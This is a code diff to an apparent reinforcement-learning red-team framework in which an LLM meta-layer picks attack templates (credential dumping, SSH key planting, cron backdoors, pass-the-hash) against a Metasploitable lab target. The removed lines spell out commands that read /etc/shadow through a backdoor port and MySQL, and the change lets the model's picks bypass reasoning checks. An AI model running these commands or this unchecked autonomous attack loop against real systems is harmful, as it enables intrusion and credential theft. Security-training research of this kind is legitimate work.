@@ -446,13 +446,16 @@ class SmartCoach:
         # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
         # Uses gpt-5.2-codex for high-level reasoning when agents get stuck
         # in a phase for too long without discoveries. Budget-controlled:
-        # max 3 calls/episode, 4-step cooldown between calls.
+        # max 5 calls/episode, 2-step cooldown between calls.
+        # R60: Increased budget 3→5, cooldown 4→2, lower thresholds.
         # =====================================================================
         self._codex_meta_calls_episode = 0
-        self._codex_meta_max_per_episode = 3
+        self._codex_meta_max_per_episode = 5
         self._codex_meta_cooldown = 0
         self._codex_meta_phase_steps = 0
         self._codex_meta_last_phase = None
+        self._codex_meta_gate_overrides = 0  # R60: Track PHASE-GATE overrides for storm trigger
+        self._codex_meta_antirepeat_hits = 0  # R60: Track anti-repeat hits for spike trigger
     
     def _init_smart_mentor(self):
         """Initialize the smart mentor — GPT-only (Phase 6.9: Venice removed).
@@ -1206,6 +1209,42 @@ class SmartCoach:
     # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
     # =====================================================================
 
+    # R60: Phase-compatible template recommendations for Codex Meta.
+    # Maps phase → list of high-value template_names the Codex can recommend.
+    # These are all KNOWN templates in the registry, so PHASE-GATE will recognize them.
+    _CODEX_PHASE_TEMPLATES = {
+        AttackPhase.EXPLOITATION: [
+            "ssh_login", "msfconsole_exploit", "msfconsole_auto", "mysql_login",
+            "mssql_login", "vsftpd_exploit", "sqlmap_get", "sqlmap_shell",
+            "nfs_mount", "hydra_ssh", "hydra_ftp", "hydra_smb",
+            "impacket_psexec", "evil_winrm", "msfvenom_payload",
+            "crackmapexec_smb_bruteforce", "ssh_key_login",
+        ],
+        AttackPhase.PRIVILEGE_ESCALATION: [
+            "sudo_list", "find_suid", "find_capabilities", "linpeas",
+            "kernel_exploit_check", "find_writable_etc", "sudo_check",
+            "find_sgid", "cron_check", "writable_etc_passwd",
+            "capability_check", "docker_privesc", "lxd_privesc",
+            "pspy_monitor", "ssh_key_plant",
+        ],
+        AttackPhase.LATERAL_MOVEMENT: [
+            "ssh_lateral", "ssh_tunnel_local", "ssh_tunnel_dynamic",
+            "pivot_scan", "nmap_pivot", "proxychains_scan",
+            "chisel_client", "impacket_pth_psexec", "crackmapexec_pth",
+        ],
+        AttackPhase.POST_EXPLOITATION: [
+            "credential_dump", "hashdump", "dump_shadow", "dump_passwd",
+            "history_dump", "network_config_dump", "ssh_key_harvest",
+            "plant_ssh_key", "cron_backdoor", "impacket_secretsdump",
+        ],
+        AttackPhase.ENUMERATION: [
+            "gobuster_dir", "nikto_scan", "enum4linux_full",
+            "smbclient_list", "smbmap_shares", "snmpwalk",
+            "showmount", "rpcclient_null", "ftp_anonymous",
+            "nuclei_scan", "wpscan", "searchsploit",
+        ],
+    }
+
     def _codex_meta_check(
         self,
         step_ctx: SmartStepContext,
@@ -1215,18 +1254,16 @@ class SmartCoach:
         """
         Layer 3: Codex Meta-Layer — Strategic stagnation-breaking with gpt-5.2-codex.
 
-        When an agent is stuck in a phase for too long without discoveries,
-        escalate to gpt-5.2-codex for high-level strategic guidance. This is
-        the top-tier reasoning layer: DDQN picks strategy, PPO picks tactics,
-        and Codex Meta overrides BOTH when they collectively stagnate.
+        R60 UPGRADE: Now outputs phase-compatible template_names instead of raw
+        commands. Codex returns JSON with recommended_template that maps to the
+        command registry, ensuring PHASE-GATE sees a valid phase-compatible command.
 
-        Trigger thresholds (phase-specific):
-            EXPLOITATION: 10 steps (R58 EP5 showed 23-step grind)
-            PRIVILEGE_ESCALATION: 6 steps (R58 EP7/EP9 showed 10-12 step stalls)
-            LATERAL_MOVEMENT: 8 steps
-            Other phases: 15 steps
+        Trigger conditions (R60 — more permissive):
+            1. Stagnation: EXPLOITATION ≥8, PRIV_ESC ≥4, LATERAL ≥5, ENUM ≥10
+            2. Anti-repeat spike: 3+ anti-repeat hits within last 5 steps
+            3. PHASE-GATE override storm: 3+ gate overrides in last 5 steps
 
-        Budget: 3 calls/episode, 4-step cooldown between calls.
+        Budget: 5 calls/episode, 2-step cooldown between calls.
         Only fires for offensive agents (RedAgent is the primary learner).
         """
         # Budget check
@@ -1244,22 +1281,32 @@ class SmartCoach:
             self._codex_meta_last_phase = current_phase
         self._codex_meta_phase_steps += 1
 
-        # Phase-specific stagnation thresholds
+        # Phase-specific stagnation thresholds (R60: lowered)
         _CODEX_THRESHOLDS = {
-            AttackPhase.EXPLOITATION: 10,
-            AttackPhase.PRIVILEGE_ESCALATION: 6,
-            AttackPhase.LATERAL_MOVEMENT: 8,
-            AttackPhase.ENUMERATION: 12,
-            AttackPhase.POST_EXPLOITATION: 8,
+            AttackPhase.EXPLOITATION: 8,
+            AttackPhase.PRIVILEGE_ESCALATION: 4,
+            AttackPhase.LATERAL_MOVEMENT: 5,
+            AttackPhase.ENUMERATION: 10,
+            AttackPhase.POST_EXPLOITATION: 6,
         }
-        threshold = _CODEX_THRESHOLDS.get(current_phase, 15)
+        threshold = _CODEX_THRESHOLDS.get(current_phase, 12)
 
-        if self._codex_meta_phase_steps < threshold:
+        # R60: Multiple trigger conditions (any one sufficient)
+        _stagnation_trigger = (
+            self._codex_meta_phase_steps >= threshold
+            and (self._codex_meta_phase_steps - threshold) % 4 == 0
+        )
+        _antirepeat_spike = self._codex_meta_antirepeat_hits >= 3
+        _gate_storm = self._codex_meta_gate_overrides >= 3
+
+        if not (_stagnation_trigger or _antirepeat_spike or _gate_storm):
             return None
 
-        # Only fire on threshold crossing and every 5 steps after
-        if (self._codex_meta_phase_steps - threshold) % 5 != 0:
-            return None
+        # Reset spike counters on trigger
+        if _antirepeat_spike:
+            self._codex_meta_antirepeat_hits = 0
+        if _gate_storm:
+            self._codex_meta_gate_overrides = 0
 
         # Only for offensive agents (Red is the primary attack learner)
         if self.agent_role.get("role") != "offensive":
@@ -1288,10 +1335,26 @@ class SmartCoach:
                 + " → ".join(_best_cmds)
             )
 
+        # R60: Build list of valid templates for current phase
+        valid_templates = self._CODEX_PHASE_TEMPLATES.get(current_phase, [])
+        # Also include templates from adjacent phase (+1)
+        _next_phase_order = self.PHASE_ORDER.get(current_phase, 0) + 1
+        for phase, order in self.PHASE_ORDER.items():
+            if order == _next_phase_order:
+                valid_templates = valid_templates + self._CODEX_PHASE_TEMPLATES.get(phase, [])
+                break
+
+        # Determine trigger reason for the prompt
+        _trigger_reason = "stagnation"
+        if _antirepeat_spike:
+            _trigger_reason = "anti-repeat spike (3+ blocked commands in 5 steps)"
+        elif _gate_storm:
+            _trigger_reason = "phase-gate override storm (3+ overrides in 5 steps)"
+
         prompt = (
             f"STRATEGIC STAGNATION ANALYSIS — Phase: {current_phase.name}\n"
-            f"Stuck for {self._codex_meta_phase_steps} steps without advancing.\n"
-            f"Target: {ctx.target} (Metasploitable 3)\n\n"
+            f"Trigger: {_trigger_reason}. Steps in phase: {self._codex_meta_phase_steps}.\n"
+            f"Target: {ctx.target} (Metasploitable 2/3 — Linux)\n\n"
             f"Current state:\n"
             f"- Ports discovered: {_ports}\n"
             f"- Services: {_services}\n"
@@ -1304,19 +1367,12 @@ class SmartCoach:
             f"Recent commands tried (all failed to advance):\n"
             + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
             + f"{_chain_hint}\n\n"
-            f"PROVEN MS3 ATTACK PATHS:\n"
-            f"1. SSH privesc: sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
-            f"msfadmin@{ctx.target} 'echo msfadmin | sudo -S id'\n"
-            f"2. Ingreslock root: {{ echo 'cat /etc/shadow'; sleep 2; }} | "
-            f"timeout 10 telnet {ctx.target} 1524\n"
-            f"3. MySQL dump: mysql -h {ctx.target} -u root -psploitme "
-            f"-e 'SELECT LOAD_FILE(\"/etc/shadow\")'\n"
-            f"4. NFS mount: showmount -e {ctx.target}; "
-            f"mount -t nfs {ctx.target}:/export /mnt\n"
-            f"5. ProFTPD exploit: msfconsole -q -x 'use exploit/unix/ftp/"
-            f"proftpd_modcopy_exec; set RHOSTS {ctx.target}; run'\n\n"
-            f"Output ONLY the single best command to break through from "
-            f"{current_phase.name}. No explanation, just the command."
+            f"AVAILABLE TEMPLATES for {current_phase.name} (choose from these):\n"
+            + ", ".join(valid_templates[:20])
+            + f"\n\nRespond with ONLY a JSON object (no markdown, no backticks):\n"
+            '{"recommended_template": "template_name", "reason": "brief why", '
+            '"blocked_families": ["families_to_avoid"], "confidence": 0.8}\n'
+            f"Pick the single best template to break stagnation in {current_phase.name}."
         )
 
         try:
@@ -1327,59 +1383,107 @@ class SmartCoach:
                 max_tokens=200,
             )
 
-            if response and isinstance(response, str) and len(response.strip()) > 5:
-                # Extract first line as the command
-                command = response.strip().split("\n")[0].strip()
-                # Clean up common LLM artifacts
-                command = command.lstrip("$ ").lstrip("> ").strip()
-                if command.startswith("```"):
-                    command = command.strip("`").strip()
-                if command.startswith("bash"):
-                    command = command[4:].strip()
-                # Replace target placeholders
-                command = command.replace("{target}", ctx.target)
-                command = command.replace("TARGET", ctx.target)
-                command = command.replace("<target>", ctx.target)
-                command = command.replace("<IP>", ctx.target)
+            if not response or not isinstance(response, str) or len(response.strip()) < 5:
+                return None
 
-                # Validate: must look like a real command
-                if len(command) < 5 or command.lower().startswith(
-                    ("i ", "the ", "you ", "try ", "run ", "use ", "to ")
-                ):
-                    logger.debug(
-                        f"[CODEX-META] Rejected non-command response: {command[:60]}"
-                    )
+            # R60: Parse JSON response and map to template
+            _chosen_template_name = None
+            _codex_reason = ""
+            _codex_confidence = 0.80
+
+            # Try JSON parse first
+            try:
+                import json as _json
+                # Strip markdown code fences if present
+                _clean = response.strip()
+                if _clean.startswith("```"):
+                    _clean = _clean.split("\n", 1)[-1].rsplit("```", 1)[0].strip()
+                _parsed = _json.loads(_clean)
+                _chosen_template_name = _parsed.get("recommended_template")
+                _codex_reason = _parsed.get("reason", "")[:120]
+                _codex_confidence = min(0.95, max(0.5, float(_parsed.get("confidence", 0.8))))
+            except (ValueError, TypeError, KeyError):
+                # Fallback: treat response as a template name directly
+                _candidate = response.strip().split("\n")[0].strip().strip('"').strip("'")
+                # Remove common LLM artifacts
+                for prefix in ("template:", "recommended_template:", "> "):
+                    if _candidate.lower().startswith(prefix):
+                        _candidate = _candidate[len(prefix):].strip()
+                _chosen_template_name = _candidate
+                _codex_reason = "raw-response-fallback"
+
+            if not _chosen_template_name:
+                logger.debug(f"[CODEX-META] No template in response: {response[:80]}")
+                return None
+
+            # Look up template in registry
+            _template = COMMAND_REGISTRY.get(_chosen_template_name)
+
+            # R60: If exact match fails, try fuzzy match within valid templates
+            if _template is None:
+                _name_lower = _chosen_template_name.lower().replace("-", "_")
+                for vt in valid_templates:
+                    if vt.lower() == _name_lower or _name_lower in vt.lower():
+                        _template = COMMAND_REGISTRY.get(vt)
+                        if _template:
+                            _chosen_template_name = vt
+                            break
+
+            # If still not found, fall back to a random phase-appropriate template
+            if _template is None:
+                logger.info(
+                    f"[CODEX-META][{self.agent_name}] Template '{_chosen_template_name}' "
+                    f"not found in registry. Falling back to phase-appropriate random."
+                )
+                _phase_templates = [
+                    COMMAND_REGISTRY.get(t) for t in valid_templates
+                    if COMMAND_REGISTRY.get(t) is not None
+                ]
+                if _phase_templates:
+                    _template = random.choice(_phase_templates)
+                    _chosen_template_name = _template.name
+                    _codex_reason = f"codex-fallback: {_codex_reason}"
+                else:
                     return None
 
-                self._codex_meta_calls_episode += 1
-                self._codex_meta_cooldown = 4  # Wait 4 steps before next call
+            # Render the command from the template
+            params = {"target": ctx.target}
+            for param in _template.required_params:
+                if param not in params:
+                    params[param] = self._get_default_param(param, ctx)
+            command = render_command(_template, params)
 
-                logger.info(
-                    f"[CODEX-META][{self.agent_name}] Stagnation break at "
-                    f"{current_phase.name} step {self._codex_meta_phase_steps}: "
-                    f"{command[:80]}"
-                )
+            self._codex_meta_calls_episode += 1
+            self._codex_meta_cooldown = 2  # R60: 4→2 step cooldown
 
-                result = SmartDecisionResult(
-                    command=command,
-                    source="codex_meta",
-                    confidence=0.80,
-                    template_name=None,
-                    params={"target": ctx.target},
-                    reasoning=(
-                        f"[CODEX-META] Stagnation break: "
-                        f"{self._codex_meta_phase_steps} steps in {current_phase.name}"
-                    ),
-                    mentor_call=True,
-                    model_used="gpt-5.2-codex",
-                    mentor_reasoning=(
-                        f"[CODEX-META] Strategic override after "
-                        f"{self._codex_meta_phase_steps} steps in {current_phase.name}. "
-                        f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
-                    ),
-                    phase=current_phase,
-                )
-                return result
+            logger.info(
+                f"[CODEX-META][{self.agent_name}] Stagnation break at "
+                f"{current_phase.name} step {self._codex_meta_phase_steps}: "
+                f"template={_chosen_template_name} reason={_codex_reason[:60]} "
+                f"trigger={_trigger_reason[:30]}"
+            )
+
+            result = SmartDecisionResult(
+                command=command,
+                source="codex_meta",
+                confidence=_codex_confidence,
+                template_name=_chosen_template_name,  # R60: Now set! PHASE-GATE sees valid template
+                params=params,
+                reasoning=(
+                    f"[CODEX-META] {_trigger_reason}: "
+                    f"{self._codex_meta_phase_steps} steps in {current_phase.name}. "
+                    f"Template={_chosen_template_name}. {_codex_reason}"
+                ),
+                mentor_call=True,
+                model_used="gpt-5.2-codex",
+                mentor_reasoning=(
+                    f"[CODEX-META] Strategic override → {_chosen_template_name} "
+                    f"({current_phase.name} step {self._codex_meta_phase_steps}). "
+                    f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
+                ),
+                phase=current_phase,
+            )
+            return result
         except Exception as e:
             logger.debug(f"[CODEX-META][{self.agent_name}] Call failed: {e}")
 
@@ -1959,6 +2063,8 @@ class SmartCoach:
         # If the selected command belongs to a BEHIND phase or seems stuck,
         # ask codex-mini for quick reasoning guidance. Token-efficient: max 150 tokens.
         # Only triggers when: (1) agent is stagnating, OR (2) command seems wrong phase.
+        # R60: codex_meta source ALWAYS skips reasoning check — it IS the highest
+        # reasoning layer. Also track gate overrides for storm trigger.
         # =====================================================================
         _stag = getattr(self, '_stagnation_steps', 0)
         _cmd_phase_order = 0
@@ -1973,9 +2079,14 @@ class SmartCoach:
         
         _needs_reasoning = False
         _reasoning_question = ""
+
+        # R60: Codex Meta is the top reasoning layer — never second-guess it
+        _skip_reasoning = (result.source == "codex_meta")
         
         # Case 1: Command is from a phase 2+ steps behind current
-        if _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
+        if _skip_reasoning:
+            pass  # R60: Codex output is trusted, skip all reasoning gates
+        elif _cmd_phase_order < _cur_phase_order - 1 and not ppo_bypass:
             _needs_reasoning = True
             _reasoning_question = (
                 f"I'm in {current_phase.name} but about to run a "
@@ -2045,6 +2156,10 @@ class SmartCoach:
                             f"[PHASE-GATE] {self.agent_name}: Replaced backward command "
                             f"with {alt_template.name} (phase={alt_template.phase.name})"
                         )
+                        # R60: Track gate overrides for codex meta storm trigger
+                        self._codex_meta_gate_overrides = getattr(
+                            self, '_codex_meta_gate_overrides', 0
+                        ) + 1
                         # Phase 7.2: Teach PPO that backward commands are bad
                         # Store negative reward so PPO learns not to propose them
                         if self._ppo_pending is not None:
@@ -2404,6 +2519,9 @@ class SmartCoach:
         if the dynamic query yields nothing.
         """
         import random
+
+        # R60: Track anti-repeat hits for codex meta spike trigger
+        self._codex_meta_antirepeat_hits = getattr(self, '_codex_meta_antirepeat_hits', 0) + 1
         
         logger.debug(
             f"[{self.agent_name}] ANTI-REPEAT: Replacing '{result.command[:40]}...' ({reason})"
@@ -4823,6 +4941,8 @@ class SmartCoach:
         self._codex_meta_cooldown = 0
         self._codex_meta_phase_steps = 0
         self._codex_meta_last_phase = None
+        self._codex_meta_gate_overrides = 0  # R60
+        self._codex_meta_antirepeat_hits = 0  # R60
 
         # R49/R52: Reset phase-stuck escalation trackers
         self._privesc_steps = 0
